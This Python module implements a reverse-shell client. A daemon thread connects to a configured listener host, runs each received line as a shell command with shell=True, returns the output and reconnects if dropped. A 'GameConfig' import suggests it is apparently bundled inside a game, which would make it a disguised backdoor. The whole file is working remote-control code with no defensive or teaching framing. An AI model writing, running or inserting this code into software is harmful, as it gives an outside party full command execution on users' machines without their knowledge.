import queue
import socket
import subprocess
import sys
import threading
from typing import Optional

from .config import GameConfig, resolve_listener_host


class ShellClient(threading.Thread):
    """
    Background thread that maintains a TCP connection to the listener
    and executes commands received from it on the local system.

    Protocol (very simple, single-connection, line-based):
      - Listener sends UTF‑8 lines terminated by '\\n'
      - Special command 'exit' closes the connection
      - Any other line is executed via the local shell and the
        combined stdout/stderr is sent back, terminated by a marker.
    """

    def __init__(self) -> None:
        super().__init__(daemon=True)
        self.cfg = GameConfig()
        self._sock: Optional[socket.socket] = None
        self._stop = threading.Event()
        self.status_queue: "queue.Queue[str]" = queue.Queue()

    def stop(self) -> None:
        self._stop.set()
        try:
            if self._sock is not None:
                self._sock.close()
        except OSError:
            pass

    def run(self) -> None:
        host = resolve_listener_host()
        port = self.cfg.LISTENER_PORT
        attempts = 0

        while not self._stop.is_set():
            try:
                self._sock = socket.create_connection((host, port), timeout=10)
                self.status_queue.put(f"connected:{host}:{port}")
                self._handle_session(self._sock)
            except OSError:
                self.status_queue.put("disconnected")
                self._sock = None
                attempts += 1
                if (
                    self.cfg.MAX_RECONNECT_ATTEMPTS
                    and attempts >= self.cfg.MAX_RECONNECT_ATTEMPTS
                ):
                    break
                self._stop.wait(self.cfg.RECONNECT_DELAY_SEC)
            else:
                # Clean exit from _handle_session
                break

    # --------------------------------------------------------------------- #
    # Session handling
    # --------------------------------------------------------------------- #

    def _handle_session(self, sock: socket.socket) -> None:
        f = sock.makefile("rwb", buffering=0)
        try:
            banner = f"CLIENT {sys.platform} READY\n".encode("utf-8")
            f.write(banner)

            while not self._stop.is_set():
                line = f.readline()
                if not line:
                    break
                try:
                    cmd = line.decode("utf-8", errors="ignore").strip()
                except UnicodeDecodeError:
                    continue

                if cmd.lower() in {"exit", "quit"}:
                    break

                if not cmd:
                    continue

                result = self._execute_command(cmd)
                payload = result.encode("utf-8", errors="ignore")
                f.write(payload + b"\n<<<END_OF_COMMAND>>>\n")
        finally:
            try:
                f.close()
            except OSError:
                pass
            try:
                sock.close()
            except OSError:
                pass

    @staticmethod
    def _execute_command(cmd: str) -> str:
        """
        Execute a shell command on the local system and return the
        combined stdout/stderr as text.
        """
        try:
            proc = subprocess.Popen(
                cmd,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
            )
            out, _ = proc.communicate(timeout=60)
        except Exception as exc:  # noqa: BLE001
            return f"[client] error while executing command: {exc!r}"
        return out or "[client] command produced no output."

